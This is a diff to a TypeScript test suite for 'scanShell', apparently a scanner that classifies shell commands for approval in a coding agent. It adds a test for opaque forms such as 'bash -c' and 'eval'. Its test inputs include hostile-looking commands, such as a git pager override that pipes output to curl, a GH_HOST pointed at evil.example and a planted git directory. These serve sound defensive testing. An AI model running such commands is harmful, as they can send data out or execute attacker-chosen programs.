@@ -349,7 +349,7 @@ describe('scanShell', () => {
       "gh api graphql -f query='query { viewer { login } }'",
       'gh api repos/o/r -i',
       'echo "$(gh pr view 1 --json title -q .title)"',
-      "cd .review-5035 && wc -l notes.txt; cat notes.txt",
+      'cd .review-5035 && wc -l notes.txt; cat notes.txt',
       "rg -n 'TODO' src | sort | uniq -c",
       'find . -name "*.ts" -newer package.json | head',
       'ls -la && pwd',
@@ -365,7 +365,10 @@ describe('scanShell', () => {
       ['an env assignment', 'GIT_PAGER=sh git log'],
       ['an exported variable', 'export GH_HOST=evil.example; gh pr view 1'],
       ['a git config override, which can name a program to run', "git -c core.pager='curl -d @- x' log"],
-      ['a harmless git config override, because repo config can run programs too', 'git -c core.quotepath=false status'],
+      [
+        'a harmless git config override, because repo config can run programs too',
+        'git -c core.quotepath=false status',
+      ],
       ['a git subcommand that changes or reaches out', 'git fetch origin'],
       ['git status, whose repo config can name an fsmonitor program', 'git status'],
       ['git pointed at a planted repo', 'git --git-dir=/tmp/evil status'],
@@ -446,9 +449,25 @@ describe('scanShell', () => {
     it('skips options before the subcommand, for the prefix and for the text matched', async () => {
       const result = await scan('pnpm --filter @x/y exec vitest run foo && git -C sub commit -m x');
       expect(result.commands).toEqual([
-        { text: 'pnpm exec vitest run foo', always: 'pnpm exec vitest *', coverable: true },
-        { text: 'git commit -m x', always: 'git commit *', coverable: true },
+        {
+          text: 'pnpm exec vitest run foo',
+          always: 'pnpm exec vitest *',
+          coverable: true,
+          words: 'pnpm --filter @x/y exec vitest run foo',
+        },
+        { text: 'git commit -m x', always: 'git commit *', coverable: true, words: 'git -C sub commit -m x' },
       ]);
+    });
+
+    it('names the opaque form of a command it cannot read into', async () => {
+      const opaque = async (command: string) => (await scan(command)).commands.map(entry => entry.opaque ?? null);
+      expect(await opaque(`node -e 'console.log(1)'`)).toEqual(['node -e']);
+      expect(await opaque('bash -c "$X"')).toEqual(['bash -c']);
+      expect(await opaque('python3 -c "print(1)"')).toEqual(['python3 -c']);
+      expect(await opaque('eval "$CMD"')).toEqual(['eval']);
+      expect(await opaque('sudo sh -c "rm x"')).toEqual(['sudo sh -c']);
+      expect(await opaque('echo x | sh')).toEqual([null, 'sh']);
+      expect(await opaque('node script.js && python3 -m pytest && git status')).toEqual([null, null, null]);
     });
 
     it('derives the prefix per sub-command', async () => {
